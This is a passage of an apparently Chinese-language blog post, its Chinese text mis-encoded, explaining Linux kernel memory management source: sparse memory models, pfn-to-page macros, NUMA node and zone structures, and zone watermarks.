class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pglist_data</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_FLAT_NODE_MEM_MAP<span class="hljs-comment">/* means !SPARSEMEM */</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">node_mem_map</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PAGE_EXTENSION</span><br>&#125;<br></code></pre></td></tr></table></figure><p>node_mem_mapæ•°ç»„ç®¡ç†page</p><p>pfnå’Œpageçš„è½¬æ¢å¤šäº†ä¸€æ­¥</p><ul><li>arch_pfn_to_nidæ ¹æ®ç‰©ç†é¡µçš„pfnå®šä½åˆ°æ‰€åœ¨node</li><li>page_to_nidæ ¹æ®pageå®šä½åˆ°æ‰€åœ¨node</li></ul><p>ä¹‹åä¸€æ ·</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">elif</span> defined(CONFIG_DISCONTIGMEM)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __pfn_to_page(pfn)\</span><br><span class="hljs-meta">(&#123;unsigned long __pfn = (pfn);\</span><br><span class="hljs-meta">unsigned long __nid = arch_pfn_to_nid(__pfn);  \</span><br><span class="hljs-meta">NODE_DATA(__nid)-&gt;node_mem_map + arch_local_page_offset(__pfn, __nid);\</span><br><span class="hljs-meta">&#125;)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __page_to_pfn(pg)\</span><br><span class="hljs-meta">(&#123;const struct page *__pg = (pg);\</span><br><span class="hljs-meta">struct pglist_data *__pgdat = NODE_DATA(page_to_nid(__pg));\</span><br><span class="hljs-meta">(unsigned long)(__pg - __pgdat-&gt;node_mem_map) +\</span><br><span class="hljs-meta"> __pgdat-&gt;node_start_pfn;\</span><br><span class="hljs-meta">&#125;)</span><br></code></pre></td></tr></table></figure><h3 id="SPARSEMEMç¨€ç–å†…å­˜æ¨¡å‹"><a href="#SPARSEMEMç¨€ç–å†…å­˜æ¨¡å‹" class="headerlink" title="SPARSEMEMç¨€ç–å†…å­˜æ¨¡å‹"></a>SPARSEMEMç¨€ç–å†…å­˜æ¨¡å‹</h3><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/SPARSEMEM.png" class title="SPARSEMEM"><p>mem_sectionç®¡ç†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mem_section</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> section_mem_map;<br>&#125;<br></code></pre></td></tr></table></figure><p>section_mem_mapå…¶å®æ˜¯ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘ç®¡ç†çš„pageæ•°ç»„</p><p>ç”¨ä¸€ä¸ªå…¨å±€æ•°ç»„ç®¡ç†æ‰€æœ‰section</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mem_section</span> **<span class="hljs-title">mem_section</span>;</span><br></code></pre></td></tr></table></figure><p>pfnå’Œpageçš„è½¬æ¢æ›´å¤æ‚äº†</p><ul><li>å¦‚æœæœ‰vmemmapç›´æ¥ä½¿ç”¨vmemapï¼ˆ64ä½ç©ºé—´å¤šéšæ„æŒ¥éœ( â€¢Ì€ Ï‰ â€¢Ì )âœ§ï¼‰</li><li>page_to_pfnå…ˆæ ¹æ®pageå®šä½åˆ°sectionï¼Œå†é€šè¿‡section_mem_mapå®šä½åˆ°pfn</li><li>pfn_to_pageå…ˆæ ¹æ®pfnå®šä½åˆ°sectionï¼Œå†é€šè¿‡pfnä»section_mem_mapæŒ‡å‘çš„æ•°ç»„å®šä½åˆ°page</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">elif</span> defined(CONFIG_SPARSEMEM_VMEMMAP)</span><br><br><span class="hljs-comment">/* memmap is virtually contiguous.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __pfn_to_page(pfn)(vmemmap + (pfn))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __page_to_pfn(page)(unsigned long)((page) - vmemmap)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">elif</span> defined(CONFIG_SPARSEMEM)</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Note: section&#x27;s mem_map is encoded to reflect its start_pfn.</span><br><span class="hljs-comment"> * section[i].section_mem_map == mem_map&#x27;s address - start_pfn;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __page_to_pfn(pg)\</span><br><span class="hljs-meta">(&#123;const struct page *__pg = (pg);\</span><br><span class="hljs-meta">int __sec = page_to_section(__pg);\</span><br><span class="hljs-meta">(unsigned long)(__pg - __section_mem_map_addr(__nr_to_section(__sec)));\</span><br><span class="hljs-meta">&#125;)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __pfn_to_page(pfn)\</span><br><span class="hljs-meta">(&#123;unsigned long __pfn = (pfn);\</span><br><span class="hljs-meta">struct mem_section *__sec = __pfn_to_section(__pfn);\</span><br><span class="hljs-meta">__section_mem_map_addr(__sec) + __pfn;\</span><br><span class="hljs-meta">&#125;)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* CONFIG_FLATMEM/DISCONTIGMEM/SPARSEMEM */</span></span><br></code></pre></td></tr></table></figure><h2 id="ç‰©ç†å†…å­˜æ¶æ„"><a href="#ç‰©ç†å†…å­˜æ¶æ„" class="headerlink" title="ç‰©ç†å†…å­˜æ¶æ„"></a>ç‰©ç†å†…å­˜æ¶æ„</h2><ul><li><p>UMAæ¶æ„ï¼ˆä¸€è‡´æ€§å†…å­˜è®¿é—®ï¼‰</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/UMA.png" class title="UMA"></li><li><p>NUMAæ¶æ„ï¼ˆéä¸€è‡´æ€§å†…å­˜è®¿é—®ï¼‰</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/NUMA.png" class title="NUMA"><p>è®¿é—®æœ¬åœ°å†…å­˜èŠ‚ç‚¹å¾ˆå¿«ï¼Œè®¿é—®å…¶ä»–å†…å­˜èŠ‚ç‚¹å¾ˆæ…¢</p></li></ul><p>NUMAçš„åˆ†é…ç­–ç•¥</p><ul><li>MPOL_BINDï¼šå¿…é¡»åœ¨ç»‘å®šçš„èŠ‚ç‚¹è¿›è¡Œåˆ†é…ï¼Œå†…å­˜ä¸è¶³åˆ™è¿›è¡Œswap</li><li>MPOL_INTERLEAVEï¼šæœ¬åœ°èŠ‚ç‚¹å’Œè¿œç¨‹èŠ‚ç‚¹éƒ½å¯ä»¥è¿›è¡Œåˆ†é…</li><li>MPOL_PREFERREDï¼šä¼˜å…ˆåœ¨æŒ‡å®šèŠ‚ç‚¹åˆ†é…å†…å­˜ï¼Œå½“æŒ‡å®šèŠ‚ç‚¹å†…å­˜ä¸è¶³æ—¶ï¼Œé€‰æ‹©ç¦»æŒ‡å®šèŠ‚ç‚¹æœ€è¿‘çš„èŠ‚ç‚¹åˆ†é…å†…å­˜</li><li>MPOL_LOCALï¼ˆé»˜è®¤ï¼‰ï¼šä¼˜å…ˆåœ¨æœ¬åœ°èŠ‚ç‚¹åˆ†é…ï¼Œå½“æœ¬åœ°èŠ‚ç‚¹å†…å­˜ä¸è¶³æ—¶ï¼Œå¯ä»¥åœ¨è¿œç¨‹èŠ‚ç‚¹åˆ†é…å†…å­˜</li></ul><h2 id="NUMAèŠ‚ç‚¹ç®¡ç†"><a href="#NUMAèŠ‚ç‚¹ç®¡ç†" class="headerlink" title="NUMAèŠ‚ç‚¹ç®¡ç†"></a>NUMAèŠ‚ç‚¹ç®¡ç†</h2><p>ç‰©ç†å†…å­˜åœ¨å†…æ ¸ä¸­ç®¡ç†çš„å±‚çº§å…³ç³»ä¸ºï¼šNodeâ†’Zoneâ†’page</p><p>ä¸€ä¸ªnodeè¡¨ç¤ºä¸€ä¸ªNUMAèŠ‚ç‚¹</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/nodes.png" class title="nodes"><p>å…ˆæ”¾ä¸€å¼ æ€»ä½“ç»“æ„å›¾</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/numanode.png" class title="numanode"><ul><li><p>ä½¿ç”¨ä¸€ä¸ªpglist_dataçš„å…¨å±€æ•°ç»„node_dataç®¡ç†æ‰€æœ‰node</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pglist_data</span> *<span class="hljs-title">node_data</span>[<span class="hljs-title">MAX_NUMNODES</span>] __<span class="hljs-title">read_mostly</span>;</span><br>EXPORT_SYMBOL(node_data);<br></code></pre></td></tr></table></figure></li><li><p>NUMAèŠ‚ç‚¹æè¿°ç»“æ„ä½“pglist_data</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pglist_data</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> <span class="hljs-title">node_zones</span>[<span class="hljs-title">MAX_NR_ZONES</span>];</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zonelist</span> <span class="hljs-title">node_zonelists</span>[<span class="hljs-title">MAX_ZONELISTS</span>];</span><br><br><span class="hljs-type">int</span> nr_zones; <span class="hljs-comment">/* number of populated zones in this node */</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> node_start_pfn;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> node_present_pages; <span class="hljs-comment">/* total number of physical pages */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> node_spanned_pages; <span class="hljs-comment">/* total size of physical page</span><br><span class="hljs-comment">     range, including holes */</span><br><span class="hljs-type">int</span> node_id;<br><span class="hljs-type">wait_queue_head_t</span> kswapd_wait;<br><span class="hljs-type">wait_queue_head_t</span> pfmemalloc_wait;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">kswapd</span>;</span><span class="hljs-comment">/* Protected by</span><br><span class="hljs-comment">   mem_hotplug_begin/end() */</span><br><span class="hljs-type">int</span> kswapd_order;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">zone_type</span> <span class="hljs-title">kswapd_highest_zoneidx</span>;</span><br><br><span class="hljs-type">int</span> kswapd_failures;<span class="hljs-comment">/* Number of &#x27;reclaimed == 0&#x27; runs */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_COMPACTION</span><br><span class="hljs-type">int</span> kcompactd_max_order;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">zone_type</span> <span class="hljs-title">kcompactd_highest_zoneidx</span>;</span><br><span class="hljs-type">wait_queue_head_t</span> kcompactd_wait;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">kcompactd</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125; <span class="hljs-type">pg_data_t</span>;<br></code></pre></td></tr></table></figure><ul><li><p>node_idï¼šNUMAèŠ‚ç‚¹id</p></li><li><p>node_mem_mapï¼špageç±»å‹æ•°ç»„ï¼ŒåŒ…å«NUMAä¸­çš„æ‰€æœ‰ç‰©ç†é¡µ</p></li><li><p>node_start_pfnï¼šæŒ‡å‘NUMAèŠ‚ç‚¹å†…ç¬¬ä¸€ä¸ªç‰©ç†é¡µçš„PFNï¼ˆPFNå…¨å±€å”¯ä¸€ï¼‰</p></li><li><p>node_present_pagesï¼šå¯ç”¨çš„ç‰©ç†é¡µé¢æ•°é‡ï¼ˆä¸åŒ…å«ç©ºæ´ï¼‰</p></li><li><p>node_spanned_pagesï¼šæ‰€æœ‰ç‰©ç†é¡µé¢æ•°é‡ï¼ˆåŒ…å«ç©ºæ´ï¼‰</p></li><li><p>nr_zonesï¼šç”¨äºç»Ÿè®¡NUMAèŠ‚ç‚¹å†…åŒ…å«çš„ç‰©ç†å†…å­˜åŒºåŸŸä¸ªæ•°</p><p><strong>æ³¨ï¼šåªæœ‰ç¬¬ä¸€ä¸ªNUMAèŠ‚ç‚¹å¯ä»¥åŒ…å«æ‰€æœ‰ç§ç±»çš„zoneï¼Œæ¯”å¦‚DMAå¿…é¡»ä»ç‰©ç†å†…å­˜èµ·ç‚¹å¼€å§‹</strong></p></li><li><p>node_zonesï¼šzoneæ•°ç»„ï¼ŒåŒ…å«NUMAèŠ‚ç‚¹ä¸­çš„æ‰€æœ‰ç‰©ç†å†…å­˜åŒºåŸŸ</p></li><li><p>node_zonelistsï¼šzonelistæ•°ç»„ï¼ŒåŒ…å«äº†å¤‡ç”¨NUMAèŠ‚ç‚¹å’Œè¿™äº›å¤‡ç”¨èŠ‚ç‚¹ä¸­çš„ç‰©ç†å†…å­˜åŒºåŸŸï¼ˆå¤‡ç”¨èŠ‚ç‚¹æŒ‰è®¿é—®è·ç¦»è¿œè¿‘æ’åˆ—ï¼‰</p></li><li><p>kswapdï¼šä¸€ä¸ªç”¨äºå›æ”¶ä¸ç»å¸¸ä½¿ç”¨çš„é¡µé¢çš„è¿›ç¨‹</p></li><li><p>kcompactdï¼šä¸€ä¸ªç”¨äºå†…å­˜çš„è§„æ•´é¿å…å†…å­˜ç¢ç‰‡çš„è¿›ç¨‹</p></li></ul></li><li><p>NUMAèŠ‚ç‚¹ç‰©ç†å†…å­˜åŒºåŸŸçš„åˆ’åˆ†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">zone_type</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ZONE_DMA</span><br>ZONE_DMA,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ZONE_DMA32</span><br>ZONE_DMA32,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>ZONE_NORMAL,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_HIGHMEM</span><br>ZONE_HIGHMEM,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>ZONE_MOVABLE,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ZONE_DEVICE</span><br>ZONE_DEVICE,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>__MAX_NR_ZONES<br><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>ZONE_DMAï¼šç”¨äºé‚£äº›æ— æ³•å¯¹å…¨éƒ¨ç‰©ç†å†…å­˜è¿›è¡Œå¯»å€çš„ç¡¬ä»¶è®¾å¤‡ï¼Œè¿›è¡Œ DMA æ—¶çš„å†…å­˜åˆ†é…ï¼ˆå¦‚ISAåªèƒ½å¯»å€å‰16Mï¼‰</li><li>ZONE_DMA32ï¼šæä¾›ç»™32ä½è®¾å¤‡ï¼ˆåªèƒ½å¯»å€4Gç‰©ç†å†…å­˜ï¼‰æ‰§è¡ŒDMAæ“ä½œæ—¶ä½¿ç”¨çš„ï¼ˆåªåœ¨64ä½ç³»ç»Ÿä¸­èµ·ä½œç”¨ï¼‰</li><li>ZONE_NORMALï¼šç›´æ¥æ˜ å°„çš„896Må‰©ä¸‹çš„éƒ¨åˆ†</li><li>ZONE_HIGHMEMï¼šå‰©ä¸‹çš„é«˜ç«¯å†…å­˜</li><li>ZONE_DEVICEï¼šä¸ºæ”¯æŒçƒ­æ’æ‹”è®¾å¤‡è€Œåˆ†é…çš„éæ˜“å¤±æ€§å†…å­˜ï¼ˆä¹Ÿå¯ç”¨äºå†…æ ¸å´©æºƒæ—¶ä¿å­˜ç›¸å…³çš„è°ƒè¯•ä¿¡æ¯ï¼‰</li><li>ZONE_MOVABLEï¼šå†…æ ¸å®šä¹‰çš„ä¸€ä¸ªè™šæ‹Ÿå†…å­˜åŒºåŸŸï¼Œè¯¥zoneä¸­çš„ç‰©ç†é¡µå¯ä»¥æ¥è‡ªäºä¸Šè¾¹ä»‹ç»çš„å‡ ç§çœŸå®çš„ç‰©ç†åŒºåŸŸï¼Œé¡µéƒ½æ˜¯å¯ä»¥è¿ç§»çš„ï¼Œä¸»è¦æ˜¯ä¸ºäº†é˜²æ­¢å†…å­˜ç¢ç‰‡å’Œæ”¯æŒå†…å­˜çš„çƒ­æ’æ‹”</li></ul></li><li><p>node_statesï¼šNUMAèŠ‚ç‚¹ä¸æ­¢ä¸€ä¸ªçš„æ—¶å€™ä½¿ç”¨ï¼Œä½å›¾ï¼Œç”¨äºç»´æŠ¤å„ä¸ªNUMAèŠ‚ç‚¹çš„çŠ¶æ€ä¿¡æ¯ï¼ˆåªæœ‰ä¸€ä¸ªNUMAèŠ‚ç‚¹æ—¶æ²¡æœ‰ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> DECLARE_BITMAP(bits, MAX_NUMNODES); &#125; <span class="hljs-type">nodemask_t</span>;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">nodemask_t</span> _unused_nodemask_arg_;<br></code></pre></td></tr></table></figure><p>èŠ‚ç‚¹çŠ¶æ€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">node_states</span> &#123;</span><br>N_POSSIBLE,<span class="hljs-comment">/* The node could become online at some point */</span><br>N_ONLINE,<span class="hljs-comment">/* The node is online */</span><br>N_NORMAL_MEMORY,<span class="hljs-comment">/* The node has regular memory */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_HIGHMEM</span><br>N_HIGH_MEMORY,<span class="hljs-comment">/* The node has regular or high memory */</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>N_HIGH_MEMORY = N_NORMAL_MEMORY,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>N_MEMORY,<span class="hljs-comment">/* The node has memory(regular, high, movable) */</span><br>N_CPU,<span class="hljs-comment">/* The node has one or more cpus */</span><br>N_GENERIC_INITIATOR,<span class="hljs-comment">/* The node has one or more Generic Initiators */</span><br>NR_NODE_STATES<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>N_POSSIBLEï¼šèŠ‚ç‚¹éšæ—¶ä¼šä¸Šçº¿</li><li>N_ONLINEï¼šèŠ‚ç‚¹å·²ä¸Šçº¿</li><li>N_NORMAL_MEMORYï¼šèŠ‚ç‚¹æ²¡æœ‰é«˜ç«¯å†…å­˜ï¼Œåªæœ‰ZONE_NORMAL</li><li>N_HIGH_MEMORYï¼šèŠ‚ç‚¹æœ‰ZONE_NORMALæˆ–è€…æœ‰ZONE_HIGHMEM</li><li>N_MEMORYï¼šèŠ‚ç‚¹æœ‰ZONE_NORMALï¼ŒZONE_HIGHMEMï¼ŒZONE_MOVABLE</li><li>N_CPUï¼šè¡¨ç¤ºèŠ‚ç‚¹åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ª CPU</li></ul></li></ul><h2 id="NUMAèŠ‚ç‚¹ä¸­çš„ç‰©ç†å†…å­˜ç®¡ç†"><a href="#NUMAèŠ‚ç‚¹ä¸­çš„ç‰©ç†å†…å­˜ç®¡ç†" class="headerlink" title="NUMAèŠ‚ç‚¹ä¸­çš„ç‰©ç†å†…å­˜ç®¡ç†"></a>NUMAèŠ‚ç‚¹ä¸­çš„ç‰©ç†å†…å­˜ç®¡ç†</h2><p>zoneå’Œnodeçš„å…³ç³»</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/zone.png" class title="zone"><p>zoneç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> _watermark[NR_WMARK];<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> watermark_boost;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_reserved_highatomic;<br><br><span class="hljs-type">long</span> lowmem_reserve[MAX_NR_ZONES];<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pglist_data</span>*<span class="hljs-title">zone_pgdat</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">per_cpu_pageset</span> __<span class="hljs-title">percpu</span> *<span class="hljs-title">pageset</span>;</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>zone_start_pfn;<br><br><span class="hljs-type">atomic_long_t</span>managed_pages;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>spanned_pages;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>present_pages;<br><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*name;<br><br>ZONE_PADDING(_pad1_)<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">free_area</span><span class="hljs-title">free_area</span>[<span class="hljs-title">MAX_ORDER</span>];</span><br><br><span class="hljs-type">spinlock_t</span>lock;<br><br>ZONE_PADDING(_pad3_)<br><span class="hljs-type">atomic_long_t</span>vm_stat[NR_VM_ZONE_STAT_ITEMS];<br>&#125; ____cacheline_internodealigned_in_smp;<br></code></pre></td></tr></table></figure><ul><li><p>lockï¼šé˜²æ­¢å¹¶å‘è®¿é—®</p></li><li><p>nameï¼šå†…å­˜åŒºåŸŸåç§°ï¼ŒNormal &#x2F; DMA &#x2F; HighMem</p></li><li><p>zone_pgdatï¼šæŒ‡å‘æ‰€å±çš„NUMAèŠ‚ç‚¹</p></li><li><p>zone_start_pfnï¼šå±äºè¯¥zoneä¸­çš„ç¬¬ä¸€ä¸ªç‰©ç†é¡µPFN</p></li><li><p>spanned_pagesï¼šzoneä¸­æ‰€æœ‰ç‰©ç†é¡µä¸ªæ•°ï¼ˆåŒ…æ‹¬ç©ºæ´ï¼‰</p></li><li><p>present_pagesï¼šzoneä¸­å¯ç”¨ç‰©ç†é¡µä¸ªæ•°ï¼ˆä¸åŒ…æ‹¬ç©ºæ´ï¼‰</p></li><li><p>managed_pagesï¼šbuddy systemç®¡ç†çš„ç‰©ç†é¡µä¸ªæ•°</p></li><li><p>free_areaï¼šbuddy systemçš„æ ¸å¿ƒæ•°æ®ç»“æ„</p></li><li><p>vm_statï¼šè¯¥zoneä½¿ç”¨çš„ç»Ÿè®¡ä¿¡æ¯</p></li><li><p>nr_reserved_highatomicï¼šè¯¥zoneé¢„ç•™å†…å­˜çš„å¤§å°[128KB, 65536KB]</p></li><li><p>lowmem_reserveï¼šè§„å®šæ¯ä¸ªå†…å­˜åŒºåŸŸå¿…é¡»ä¸ºè‡ªå·±ä¿ç•™çš„ç‰©ç†é¡µæ•°é‡ï¼Œé˜²æ­¢æ›´é«˜ä½çš„å†…å­˜åŒºåŸŸå¯¹è‡ªå·±çš„å†…å­˜ç©ºé—´è¿›è¡Œè¿‡å¤šçš„ä¾µå æŒ¤å‹</p></li><li><p>_watermarkï¼šç‰©ç†å†…å­˜åŒºåŸŸä¸­çš„æ°´ä½çº¿</p><ul><li>ç‰©ç†å†…å­˜å‰©ä½™å®¹é‡å¤§äº_watermark[WMARK_HIGH] â†’ å†…å­˜å……è¶³ï¼Œåˆ†é…æ— å‹åŠ›</li><li>å¤§äº_watermark[WMARK_LOW]ï¼Œå°äº_watermark[WMARK_HIGH] â†’ åˆ†é…æœ‰å‹åŠ›ä½†å¯æ¥å—</li><li>å¤§äº_watermark[WMARK_MIN]ï¼Œå°äº_watermark[WMARK_LOW] â†’ å”¤é†’kswapdè¿›ç¨‹å¼€å§‹å¼‚æ­¥å›æ”¶</li><li>å°äº_watermark[WMARK_MIN] â†’ é˜»å¡è¯·æ±‚åˆ†é…çš„è¿›ç¨‹ï¼Œå”¤é†’kswapdè¿›ç¨‹è¿›è¡Œå›æ”¶ï¼Œå›æ”¶å®Œæ¯•å”¤é†’é˜»å¡çš„è¿›ç¨‹</li></ul></li><li><p>watermark_boostï¼šä¼˜åŒ–å†…å­˜ç¢ç‰‡å¯¹å†…å­˜åˆ†é…çš„å½±å“ï¼Œå¯ä»¥åŠ¨æ€æ”¹å˜å†…å­˜åŒºåŸŸçš„åŸºå‡†æ°´ä½çº¿</p></li><li><p>pagesetï¼šper_cpu_pagesetï¼Œç®¡ç†å†·çƒ­é¡µï¼ˆ__percpuå˜é‡ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">per_cpu_pageset</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">per_cpu_pages</span> <span class="hljs-title">pcp</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>ç”¨ä¸€ä¸ªåŒå‘åˆ—è¡¨ç®¡ç†per_cpu_pagesï¼Œçƒ­é¡µåœ¨å‰ï¼Œå†·é¡µåœ¨å</p><p>per_cpu_pagesç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span 